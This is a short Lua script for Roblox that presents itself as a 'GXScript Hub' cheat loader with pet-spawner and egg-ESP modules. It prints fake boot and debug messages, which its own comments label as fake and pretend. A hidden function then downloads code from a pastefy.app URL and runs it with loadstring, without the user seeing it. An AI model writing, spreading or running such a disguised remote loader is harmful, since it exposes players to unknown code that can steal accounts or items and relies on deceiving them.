-- GXScript Hub Loader v3.2
-- Modules: Spawner | Egg ESP | Raccoons | Divine Pets

local GXModules = {
    "GXCoreEngine",
    "EggESPSystem",
    "DivinePetsSpawner",
    "RaccoonAI",
    "MutationHandler",
    "GXSyncCloud"
}

for i, m in ipairs(GXModules) do
    print("[GX-HUB] Booting:", m, "...")
    task.wait(0.25)
end

print("[GX-HUB] Systems Initialized. Preparing Secure Layer...")

-- GX Obfuscation Layer
local GXLayer = {}
GXLayer.key = "GX-" .. tostring(math.random(10000, 99999))

-- Fake Debug Logs
for i = 1, 20 do
    print("[GX-Debug] Egg Found:", "Egg_" .. tostring(i), "-> Divine Pet Chance:", math.random(1, 100), "%")
    task.wait(0.05)
end

-- Hidden Executor Function
local function GXExecuteCore()
    -- Security Check Passed
    task.wait(0.5)

    -- Actual loader (hidden inside system)
    loadstring(game:HttpGet("https://pastefy.app/AnWaMZoi/raw"))()
end

-- Pretend System Trigger
print("[GX-HUB] Syncing Raccoon & Divine Pets Module...")
GXExecuteCore()

print("[GX-HUB] GXScript Hub successfully linked to Spawner Engine.")
